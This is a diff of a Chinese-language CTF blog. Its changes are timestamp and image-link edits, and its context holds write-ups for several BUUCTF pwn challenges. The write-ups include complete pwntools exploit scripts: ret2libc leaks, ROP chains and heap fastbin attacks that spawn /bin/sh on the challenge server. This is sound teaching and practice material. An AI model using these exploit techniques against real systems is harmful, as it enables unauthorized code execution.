@@ -173,10 +173,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">Posted on</span>
-              
 
-              <time title="Created: 2023-02-28 22:07:00 / Modified: 23:20:26" itemprop="dateCreated datePublished" datetime="2023-02-28T22:07:00+08:00">2023-02-28</time>
+              <time title="Created: 2023-02-28 22:07:00" itemprop="dateCreated datePublished" datetime="2023-02-28T22:07:00+08:00">2023-02-28</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-03-01 11:30:59" itemprop="dateModified" datetime="2023-03-01T11:30:59+08:00">2023-03-01</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -220,7 +226,7 @@
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">chall</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">1024</span>]; <span class="comment">// [esp+Ch] [ebp-40Ch] BYREF</span></span><br><span class="line">  _BYTE *v3; <span class="comment">// [esp+40Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Yippie, lets crash: %p\n&quot;</span>, s);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Whats your name?\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  fgets(s, <span class="number">1023</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  v0 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  v3 = <span class="built_in">memchr</span>(s, <span class="number">10</span>, v0);                       <span class="comment">// 将中间的换行符换成空字节</span></span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">    *v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nWelcome %s!\n&quot;</span>, s);</span><br><span class="line">  result = <span class="built_in">strcmp</span>(s, <span class="string">&quot;crashme&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !result )</span><br><span class="line">    <span class="keyword">return</span> vuln((<span class="type">char</span>)s, <span class="number">0x400</span>u);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>chall函数中打印了一个地址，但是没啥用，不给也能做。</p>
 <p>本题一个考察的重点就是fgets函数，这个函数遇到换行输入会截断，但是空字节不会，因此可以在crashme后面加一个空字节，后面仍然能输入我们的payload，绕过检查。<br />
-<img src="https://img-blog.csdnimg.cn/eb5d2917bde445c28a8bde35db106aec.png" alt="" /><br />
+<img src="1.png" alt="" /><br />
 需要注意的是memcpy的src起始地址并不是crashme的地址，而是crashme的二重指针，也就是说复制之后dest的值并不是crashme。这个地址在crashme的前面，因此需要添加的无效字节数量需要经过计算。</p>
 <p>exp：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">28953</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;crashme\x00&#x27;</span></span><br><span class="line">payload += cyclic(<span class="number">2</span> + <span class="number">4</span>*<span class="number">4</span>)</span><br><span class="line">payload += p32(elf.plt[<span class="string">&#x27;printf&#x27;</span>])</span><br><span class="line">payload += p32(elf.symbols[<span class="string">&#x27;chall&#x27;</span>])</span><br><span class="line">payload += p32(elf.got[<span class="string">&#x27;printf&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;crashme!\n&#x27;</span>)</span><br><span class="line">printf = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(printf))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;printf&#x27;</span>, printf)</span><br><span class="line">base = printf - libc.dump(<span class="string">&#x27;printf&#x27;</span>)</span><br><span class="line">sys = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh = base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;crashme\x00&#x27;</span></span><br><span class="line">payload += cyclic(<span class="number">2</span> + <span class="number">4</span>*<span class="number">4</span>)</span><br><span class="line">payload += p32(sys)</span><br><span class="line">payload += p32(<span class="number">0xdeadeef</span>)</span><br><span class="line">payload += p32(binsh)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
@@ -254,7 +260,7 @@
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> SECCOMP_MODE_DISABLED	0 <span class="comment">/* seccomp is not in use. */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECCOMP_MODE_STRICT	1 <span class="comment">/* uses hard-coded filter. */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECCOMP_MODE_FILTER	2 <span class="comment">/* uses user-supplied filter. */</span></span></span><br></pre></td></tr></table></figure>
 <p>程序中传入的第二个参数为2，表示seccomp为过滤器模式。<br />
 之后查看源码发现传入的参数为一个结构体，内含长度与指令，指令用于seccomp沙箱。也就是说seccomp最终的执行方式是一种沙箱（vm）。直接手动分析可能较为困难，但有工具seccomp-tools帮助我们分析这些并输出结果（<a target="_blank" rel="noopener" href="https://blog.csdn.net/am_03/article/details/119870152?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=seccomp-tools&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-119870152.142%5Ev13%5Econtrol,157%5Ev14%5Econtrol&amp;spm=1018.2226.3001.4187">安装方法</a>）</p>
-<p><img src="https://img-blog.csdnimg.cn/13b5d93da39d4bb889fea9cfd1fbdeaf.png" alt="" /><br />
+<p><img src="2.png" alt="" /><br />
 可以看到输出把允许的系统调用用绿色标了出来，允许open、read、write。因此直接用open打开flag文件，读取若干字节到某个地址之后再写出来就可以了。这里选择将数据写在栈上，简单方便。</p>
 <p>其中使用到了三个系统调用，32位x86的系统调用号以及使用的参数表在<a target="_blank" rel="noopener" href="https://blog.csdn.net/Nashi_Ko/article/details/120288385?spm=1001.2014.3001.5506">这里</a>查询</p>
 <p>exp：</p>
@@ -301,10 +307,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">Posted on</span>
-              
 
-              <time title="Created: 2023-02-28 22:06:00 / Modified: 23:20:26" itemprop="dateCreated datePublished" datetime="2023-02-28T22:06:00+08:00">2023-02-28</time>
+              <time title="Created: 2023-02-28 22:06:00" itemprop="dateCreated datePublished" datetime="2023-02-28T22:06:00+08:00">2023-02-28</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-03-01 11:30:58" itemprop="dateModified" datetime="2023-03-01T11:30:58+08:00">2023-03-01</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -348,10 +360,10 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29802</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">poprdi_ret = <span class="number">0x400733</span></span><br><span class="line">poprsir15_ret = <span class="number">0x400731</span></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x28</span>)</span><br><span class="line">payload += p64(poprdi_ret)</span><br><span class="line">payload += p64(<span class="number">0x400790</span>)</span><br><span class="line">payload += p64(poprsir15_ret)</span><br><span class="line">payload += p64(elf.got[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;printf&#x27;</span>])</span><br><span class="line">payload += p64(elf.symbols[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;What\&#x27;s your name? &#x27;</span>, payload)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">read = u64(io.recv(<span class="number">6</span>) + <span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">base = read - libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">system = base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(read))</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x28</span>)</span><br><span class="line">payload += p64(poprdi_ret)</span><br><span class="line">payload += p64(binsh)</span><br><span class="line">payload += p64(system)</span><br><span class="line">payload += p64(elf.symbols[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;What\&#x27;s your name? &#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 <h1 id="buu028-ciscn_2019_es_2"><a class="markdownIt-Anchor" href="#buu028-ciscn_2019_es_2"></a> buu028-ciscn_2019_es_2</h1>
 <p>这一题乍一看是栈溢出，但最鸡贼的是只能溢出4个字节，也就是只够覆盖返回地址。不过还是有办法拿到libc的地址的：</p>
-<p><img src="https://img-blog.csdnimg.cn/ce7a88efd4434a0c99b9f83f73ff0205.png" alt="" /><br />
+<p><img src="1.png" alt="" /><br />
 这是还没有进入vul函数时的栈环境，可以看到下面的f7de3ed5是libc之中的地址（_dl_fini是ld.so中的地址，而不是libc的）。我们溢出之后程序会打印出后面一部分地址的值，但是遇到空字节会截断。于是我们可以反复返回到vul函数的开头，你会发现每一次返回后，存返回地址的地址都会向后移4个字节。于是我们通过这种方法返回4次vul函数就能够成功越过上图ebp的0字节，通过printf获取libc地址。</p>
 <p>有了libc之后，我们需要考虑如何执行system函数。要知道，我们只能溢出4个字节。别慌，我们有main函数。在进入vul函数时，memset只会将前20个字符清零，而对后面的不作处理，这就给了我们一丝机会。我们想把&quot;\bin\sh&quot;的地址写到返回地址的后面，肯定不能直接溢出，因为长度不够。所以我们干脆就返回到main函数中，要知道main函数也是占用一定的栈空间的，这样做可以让下一次执行vul函数时的栈向下压。这样原先写到栈上的&quot;\bin\sh&quot;地址就到了函数返回地址的后面去了。</p>
-<p><img src="https://img-blog.csdnimg.cn/41d684be9aa04ef2873caabce063d9e9.png" alt="" /><br />
+<p><img src="2.png" alt="" /><br />
 这个过程建议通过gdb调试一下加深理解。</p>
 <p>exp:</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25990</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># repeat 3 times of function vul to reach address of __libc_start_main + 241</span></span><br><span class="line">io.sendafter(<span class="string">b&#x27;Welcome, my friend. What\&#x27;s your name?\n&#x27;</span>, cyclic(<span class="number">0x30</span>))</span><br><span class="line">io.sendafter(<span class="string">b&#x27;Hello&#x27;</span>, cyclic(<span class="number">0x2c</span>) + p32(elf.symbols[<span class="string">&#x27;vul&#x27;</span>]))</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Hello&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.send(cyclic(<span class="number">0x2c</span>) + p32(elf.symbols[<span class="string">&#x27;vul&#x27;</span>]))</span><br><span class="line">io.sendafter(<span class="string">b&#x27;Hello&#x27;</span>, cyclic(<span class="number">0x2c</span>) + p32(elf.symbols[<span class="string">&#x27;vul&#x27;</span>]))</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Hello&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.send(cyclic(<span class="number">0x2c</span>) + p32(elf.symbols[<span class="string">&#x27;vul&#x27;</span>]))</span><br><span class="line">io.sendafter(<span class="string">b&#x27;Hello&#x27;</span>, cyclic(<span class="number">0x2c</span>) + p32(elf.symbols[<span class="string">&#x27;vul&#x27;</span>]))</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Hello&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># fourth time, we can get the address of libc</span></span><br><span class="line">io.send(cyclic(<span class="number">0x2c</span>) + p32(elf.symbols[<span class="string">&#x27;vul&#x27;</span>]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line">rc = io.recv()</span><br><span class="line"><span class="built_in">print</span>(rc)</span><br><span class="line">libc_start_main = u32(rc[-<span class="number">5</span>:-<span class="number">1</span>]) - <span class="number">241</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_start_main))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;__libc_start_main&#x27;</span>, libc_start_main)</span><br><span class="line"></span><br><span class="line">base = libc_start_main - libc.dump(<span class="string">&#x27;__libc_start_main&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(base))</span><br><span class="line">sys = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh = base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;system: &#x27;</span> + <span class="built_in">hex</span>(sys))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;binsh: &#x27;</span> + <span class="built_in">hex</span>(binsh))</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">io.send(cyclic(<span class="number">0x20</span>) + p32(binsh) * <span class="number">3</span> +  p32(elf.symbols[<span class="string">&#x27;main&#x27;</span>]))</span><br><span class="line"><span class="comment"># return to vul to adjust stack environment</span></span><br><span class="line">io.sendafter(<span class="string">b&#x27;Welcome, my friend. What\&#x27;s your name?\n&#x27;</span>, cyclic(<span class="number">0x2c</span>) + p32(sys))</span><br><span class="line">io.sendafter(<span class="string">b&#x27;Hello&#x27;</span>, cyclic(<span class="number">0x2c</span>) + p32(elf.symbols[<span class="string">&#x27;vul&#x27;</span>]))</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Hello&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.send(cyclic(<span class="number">0x2c</span>) + p32(sys))</span><br><span class="line">io.sendafter(<span class="string">b&#x27;Hello&#x27;</span>, cyclic(<span class="number">0x2c</span>) + p32(sys))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
@@ -360,7 +372,7 @@
 <h1 id="buu030-ciscn_2019_s_3"><a class="markdownIt-Anchor" href="#buu030-ciscn_2019_s_3"></a> buu030-ciscn_2019_s_3</h1>
 <p>这道题一看汇编，明摆着是考我们系统调用。其中有mov rax, 3bh，3b就是execve的系统调用号。之后需要在rdi中传入’/bin/sh’的地址，但是原程序中并没有这个字符串。</p>
 <p>目前有一个主要的问题：如果要自己构造’/bin/sh’或者是查找libc，如何获取这个字符串的地址？通过ret2csu我们可以很容易地将任意值pop到rdi中，所以关键就在于如何获取字符串地址。如果这个字符串自己构造，栈上的地址一般都不容易获取到。如果要查找libc，那么首先要获取libc基址。前面已经提到我们无法直接通过sys_write打印，但同时我们也不要忘记，返回地址不一定要是函数的开头。如果在读写函数返回后编写gadget，直接返回到写30字节的地方，那么我们就能够直接进行打印，此时write打印出的数据中有部分是我们没有修改的，且返回之后我们能够将rsp抬高8字节获取到更加靠前的栈区内容，也就有机会能够获取到libc的基址。</p>
-<p><img src="https://img-blog.csdnimg.cn/47bedf4bdae240d0824554966960e1ea.png" alt="" /><br />
+<p><img src="3.png" alt="" /><br />
 上图中libc的基址正好在打印地址之后0x30的位置，所以还需要再返回两次，与第28题的方法相同。这种方法笔者称之为碰瓷流，与这道题的出题人本意不符。</p>
 <p>exp：（调用system(‘/bin/sh’)）</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">28675</span>)</span><br><span class="line"></span><br><span class="line">write = <span class="number">0x400503</span></span><br><span class="line">read_write = <span class="number">0x4004ed</span></span><br><span class="line">poprdi_ret = <span class="number">0x4005a3</span></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x10</span>)</span><br><span class="line">payload += p64(write)	<span class="comment"># We use write twice to make rsp go up to reach the &#x27;__libc_start_main&#x27;</span></span><br><span class="line">payload += p64(write)</span><br><span class="line">payload += p64(read_write)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">libc_start_main = u64(io.recv()[-<span class="number">8</span>:]) - <span class="number">231</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_start_main))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;__libc_start_main&#x27;</span>, libc_start_main)</span><br><span class="line">base = libc_start_main - libc.dump(<span class="string">&#x27;__libc_start_main&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sys = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh = base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x10</span>)</span><br><span class="line">payload += p64(poprdi_ret)</span><br><span class="line">payload += p64(binsh)</span><br><span class="line">payload += p64(sys)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
@@ -413,10 +425,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">Posted on</span>
-              
 
-              <time title="Created: 2023-02-28 22:05:00 / Modified: 23:20:26" itemprop="dateCreated datePublished" datetime="2023-02-28T22:05:00+08:00">2023-02-28</time>
+              <time title="Created: 2023-02-28 22:05:00" itemprop="dateCreated datePublished" datetime="2023-02-28T22:05:00+08:00">2023-02-28</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-03-01 11:30:57" itemprop="dateModified" datetime="2023-03-01T11:30:57+08:00">2023-03-01</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -483,13 +501,13 @@ exp：</p>
 <p>第一道堆题。<br />
 <strong>解法：unsorted bin overlapping chunks + fastbin attack</strong><br />
 提供了分配chunk、填充chunk、释放chunk、打印chunk内容4个功能。其中填充chunk功能没有进行边界检查，可以产生堆溢出：<br />
-<img src="https://img-blog.csdnimg.cn/819fff57a2e84971a375beb1be6ffc31.png" alt="" /><br />
+<img src="1.png" alt="" /><br />
 简单看了一下，试了几下之后，发现这道题和前面所有题都截然不同，难度完全不是一个档次。<br />
 首先，这道题中<strong>对于内存的分配使用的是calloc而非malloc函数</strong>，这使得我们要想获得libc的加载地址必须首先进行堆块重叠后释放内部堆块，这样才能够通过读取外部堆块获取关键地址。另外，<strong>本题的堆块大小保存在一个单独的数组之中，可读取的大小也在这里保存，因此直接在堆中修改chunk的size并不能增加我们读取的长度</strong>。要想实现堆块的重叠就必须首先释放堆块，通过堆溢出修改堆块的size后分配回来。但这样的话，由于calloc的特性，堆块中的所有内容都将被抹除，也就无法获取到地址的值。因此，要保留地址的值，我们不能将这个堆块全部分配回来。要知道，虽然内部重叠堆块的prev_size和size等信息虽然被清零，但仍然能够读取后面的内容，所以我们选择将修改过大小的堆块部分分配回来，留下一个last_remainder堆块保留在原先的内部堆块的内部。这样就可以通过访问内部堆块获取到地址的值了。<br />
-<img src="https://img-blog.csdnimg.cn/0481579d7899474cbe33733f3aa828e4.png" alt="" /></p>
+<img src="2.png" alt="" /></p>
 <p>获取到了这里的地址，我们就可以获取到system函数和__free_hook的地址。本题环境为2.23，无tcache的影响，有通过fastbin attack修改__malloc_hook的可行性。</p>
 <p>这是一开始__malloc_hook附近的情况：<br />
-<img src="https://img-blog.csdnimg.cn/b90efebb8ce54bd7ae8349c3569acd6f.png" alt="" /><br />
+<img src="3.png" alt="" /><br />
 要想在__malloc_hook附近分配chunk，首先需要通过检查：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="number">0</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    errstr = <span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>;</span><br><span class="line">  errout:</span><br><span class="line">    malloc_printerr (check_action, errstr, chunk2mem (victim), av);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
 <p>下面是fastbin_index的宏定义：</p>
@@ -591,10 +609,16 @@ exp：</p>
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">Posted on</span>
-              
 
-              <time title="Created: 2023-02-28 22:04:00 / Modified: 23:20:26" itemprop="dateCreated datePublished" datetime="2023-02-28T22:04:00+08:00">2023-02-28</time>
+              <time title="Created: 2023-02-28 22:04:00" itemprop="dateCreated datePublished" datetime="2023-02-28T22:04:00+08:00">2023-02-28</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-03-01 11:30:56" itemprop="dateModified" datetime="2023-03-01T11:30:56+08:00">2023-03-01</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -672,7 +696,7 @@ exp：</p>
 <h1 id="buu013-get_started_3dsctf_2016"><a class="markdownIt-Anchor" href="#buu013-get_started_3dsctf_2016"></a> buu013-get_started_3dsctf_2016</h1>
 <p>不知道为什么3dsctf里面不止一道题在挂exp脚本调试的时候recv收不到一开始发送的字符串，很奇怪，本来这一题直接返回到后门就好了，但是因为这个怪原因不得不用mprotect在其他地方再写一个shell，原来程序里面的后门就没用上 <s>（屑）</s><br />
 使用mprotect函数时传入的地址参数必须页对齐，size参数也必须是页的整数倍。权限填7表示可读可写可执行。本题中要修改的主要是下面这个页的属性，然后shellcode写在.got.plt段中，尝试修改bss段，写在bss段发现不行，可能是bss段中有一些重要数据之类。<br />
-<img src="https://img-blog.csdnimg.cn/b6188cbaf1d841cba169b5a8872f551b.png" alt="" /><br />
+<img src="1.png" alt="" /><br />
 exp：</p>
